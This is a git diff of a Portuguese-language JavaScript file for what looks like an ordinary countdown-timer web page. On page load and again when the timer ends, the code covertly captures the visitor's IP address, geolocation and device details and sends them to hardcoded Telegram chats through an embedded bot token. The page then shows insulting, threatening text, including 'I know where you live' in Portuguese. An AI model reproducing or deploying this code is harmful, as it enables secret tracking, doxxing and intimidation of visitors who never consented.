@@ -1,14 +1,10 @@
 // ================================================
-// script.js - Entrada + Timer Zerar (Mensagens Diferentes)
+// script.js - Entrada + Timer Zerar (Mensagens Diferentes) + Cooldown Fixo
 // ================================================
 
 let targetDate = new Date("2026-04-25T23:59:59").getTime();
 let timerInterval = null;
-let userIP = '';
-let userLatitude = '';
-let userLongitude = '';
 
-// ==================== CONFIGURAÇÕES ====================
 const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
 
 const CHAT_IDS = [
@@ -20,7 +16,6 @@ const CHAT_IDS = [
 const processedIPs = new Map();
 const COOLDOWN_TIME = 5 * 60 * 1000; // 5 minutos
 
-// ==================== DETECÇÃO DE DISPOSITIVO ====================
 function detectDeviceType() {
     const ua = navigator.userAgent.toLowerCase();
     if (/smart-tv|tv|crkey|roku|android tv|firetv/i.test(ua)) return "Smart TV";
@@ -47,12 +42,36 @@ function getDeviceInfo() {
     };
 }
 
+// ==================== FUNÇÃO PARA PEGAR IP (mais estável) ====================
+async function getCurrentIP() {
+    try {
+        // Tenta várias fontes em ordem
+        let res = await fetch('https://api.my-ip.io/ip.json');
+        let data = await res.json();
+        if (data.ip) return data.ip;
+
+        res = await fetch('https://api.ipify.org?format=json');
+        data = await res.json();
+        return data.ip;
+    } catch (e) {
+        console.error("Erro ao pegar IP:", e);
+        return "Não capturado";
+    }
+}
+
 // ==================== MENSAGEM QUANDO ALGUÉM ENTRA ====================
-async function sendEntryMessage(ip, latitude, longitude) {
+async function sendEntryMessage(ip, lat, lon) {
     const device = getDeviceInfo();
     const devType = device.deviceType;
 
-    const message = `LUIZ MACACO\n`;
+    const message = `👀 ALGUÉM ENTROU NO SITE!\n\n` +
+                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
+                    `🌐 IP: ${ip || 'Não capturado'}\n` +
+                    `📍 Lat: ${lat || 'N/D'} | Lon: ${lon || 'N/D'}\n` +
+                    `📱 Tipo: ${devType}\n` +
+                    `• Sistema: ${device.platform}\n` +
+                    `• Tela: ${device.screen}\n\n` +
+                    `Alguém abriu a página... será que vai aguentar até o final? 😈`;
 
     for (const chatId of CHAT_IDS) {
         try {
@@ -62,39 +81,42 @@ async function sendEntryMessage(ip, latitude, longitude) {
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
         } catch (err) {
-            console.error("Erro ao enviar mensagem de entrada:", err);
+            console.error("Erro mensagem entrada:", err);
         }
     }
 }
 
-// ==================== MENSAGEM QUANDO O TIMER ZERAR (PESADA) ====================
-async function sendTimerZeroMessage(ip, latitude, longitude) {
+// ==================== MENSAGEM QUANDO TIMER ZERAR ====================
+async function sendTimerZeroMessage(ip, lat, lon) {
+    const now = Date.now();
+
+    if (ip && processedIPs.has(ip)) {
+        if (now - processedIPs.get(ip) < COOLDOWN_TIME) {
+            console.log(`⏳ Cooldown ativo para IP: ${ip}`);
+            return;
+        }
+    }
+
+    if (ip) processedIPs.set(ip, now);
+
     const device = getDeviceInfo();
     const devType = device.deviceType;
 
     const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                     `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n` +
                     `🌐 IP: ${ip || 'Não capturado'}\n` +
-                    `📍 Latitude: ${latitude || 'Não disponível'}\n` +
-                    `📍 Longitude: ${longitude || 'Não disponível'}\n\n` +
+                    `📍 Latitude: ${lat || 'Não disponível'}\n` +
+                    `📍 Longitude: ${lon || 'Não disponível'}\n\n` +
                     `📱 Dispositivo:\n` +
                     `• Tipo: ${devType}\n` +
                     `• Sistema: ${device.platform}\n` +
                     `• Navegador: ${device.userAgent.substring(0, 100)}...\n` +
-                    `• Tela: ${device.screen} (${device.pixelRatio || 1}x)\n` +
+                    `• Tela: ${device.screen}\n` +
                     `• Janela: ${device.windowSize}\n` +
-                    `• Idioma: ${device.language}\n` +
-                    `• Fuso horário: ${device.timezone}\n` +
-                    `• Núcleos CPU: ${device.hardwareConcurrency}\n` +
-                    `• Memória RAM aprox: ${device.deviceMemory}\n\n` +
-                    `===================================\n` +
-                    `HAHAHAHAHA OLHA SÓ QUE LIXO\n` +
-                    `Ficou esperando o timer acabar no ${devType.toLowerCase()} kkkkk\n\n` +
-                    `Eu sei que você tá usando essa merda de ${devType}.\n` +
-                    `Eu sei onde você mora.\n` +
-                    `Eu sei qual IP de merda é esse.\n\n` +
-                    `Você não passa de um fracassado inútil.\n` +
-                    `Perdedor de merda.\n\n` +
+                    `• Fuso: ${device.timezone}\n` +
+                    `• RAM: ${device.deviceMemory}\n\n` +
+                    `HAHAHAHAHA QUE LIXO KKKKK\n` +
+                    `Esperou até o final no ${devType.toLowerCase()}...\n\n` +
                     `Não é magia, é habilidade isto...`;
 
     for (const chatId of CHAT_IDS) {
@@ -105,39 +127,33 @@ async function sendTimerZeroMessage(ip, latitude, longitude) {
                 body: JSON.stringify({ chat_id: chatId, text: message })
             });
         } catch (err) {
-            console.error("Erro ao enviar mensagem de timer zero:", err);
+            console.error("Erro mensagem timer zero:", err);
         }
     }
 }
 
-// ==================== PEGA IP AO ENTRAR NA PÁGINA ====================
-async function captureUserIP() {
+// ==================== CAPTURA IP AO ENTRAR ====================
+async function captureIPOnLoad() {
+    const ip = await getCurrentIP();
+    let lat = '', lon = '';
+
     try {
-        const res = await fetch('https://api.ipify.org?format=json');
-        const data = await res.json();
-        userIP = data.ip;
-
-        const locRes = await fetch(`http://ip-api.com/json/${userIP}?fields=status,lat,lon`);
+        const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon`);
         const locData = await locRes.json();
-
         if (locData.status === "success") {
-            userLatitude = locData.lat || '';
-            userLongitude = locData.lon || '';
+            lat = locData.lat || '';
+            lon = locData.lon || '';
         }
+    } catch (e) {}
 
-        console.log(`✅ IP capturado ao entrar: ${userIP}`);
+    userIP = ip;
+    userLatitude = lat;
+    userLongitude = lon;
 
-        // Envia mensagem de "Alguém entrou"
-        sendEntryMessage(userIP, userLatitude, userLongitude);
-
-    } catch (err) {
-        console.error("Erro ao capturar IP:", err);
-        userIP = 'Não capturado';
-        sendEntryMessage('Não capturado', '', '');
-    }
+    await sendEntryMessage(ip, lat, lon);
 }
 
-// ==================== ATUALIZA O TIMER ====================
+// ==================== UPDATE TIMER ====================
 function updateTimer() {
     const timeNow = new Date().getTime();
     let timeLeft = targetDate - timeNow;
@@ -145,14 +161,25 @@ function updateTimer() {
     if (timeLeft < 0) {
         clearInterval(timerInterval);
 
-        // Envia a mensagem pesada quando o timer zera
-        sendTimerZeroMessage(userIP, userLatitude, userLongitude);
-        
+        // Pega IP novamente no momento que zera
+        getCurrentIP().then(async (ip) => {
+            let lat = '', lon = '';
+            try {
+                const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,lat,lon`);
+                const loc = await locRes.json();
+                if (loc.status === "success") {
+                    lat = loc.lat || '';
+                    lon = loc.lon || '';
+                }
+            } catch (e) {}
+
+            sendTimerZeroMessage(ip, lat, lon);
+        });
+
         showFinalMessageOnScreen();
         return;
     }
 
-    // Contador normal
     const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
     const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
     const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
@@ -172,17 +199,14 @@ function showFinalMessageOnScreen() {
         Eu sei que você tá usando essa merda de ${deviceType.toLowerCase()}.<br>
         Eu sei onde você mora.<br>
         Eu sei o seu IP de merda.<br><br>
-        Você é um fracassado patético.<br>
-        Um inútil.<br>
-        Um perdedor que não consegue nem ganhar de um timer.<br><br>
-        Não é magia, é habilidade isto...<br>
-        <span style="color: #ff0000; font-size: 1.3rem;">E você continua sendo um nada.</span>
+        Você é um fracassado patético.<br><br>
+        Não é magia, é habilidade isto...
     `;
 }
 
 // ==================== INICIALIZAÇÃO ====================
 async function init() {
-    await captureUserIP();           // Pega IP + envia mensagem de entrada
+    await captureIPOnLoad();           // Pega IP + envia "Alguém entrou"
     timerInterval = setInterval(updateTimer, 100);
     updateTimer();
 }
